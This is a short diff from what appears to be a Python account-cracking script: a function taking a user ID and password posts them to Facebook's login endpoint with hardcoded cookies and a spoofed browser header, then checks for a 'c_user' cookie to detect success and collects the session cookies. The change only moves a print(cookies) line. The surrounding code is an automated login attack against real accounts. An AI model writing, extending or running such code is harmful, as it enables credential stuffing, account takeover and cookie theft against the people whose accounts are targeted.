@@ -1397,7 +1397,6 @@ def p(uid,pwx,tl):
             'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnQgNH.AWU_xDAVlvM',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
             'wd': '1440x402',}
-            print(cookies)
             headers ={
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -1420,6 +1419,7 @@ def p(uid,pwx,tl):
             url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131"
             po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
+            print(cookies)
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
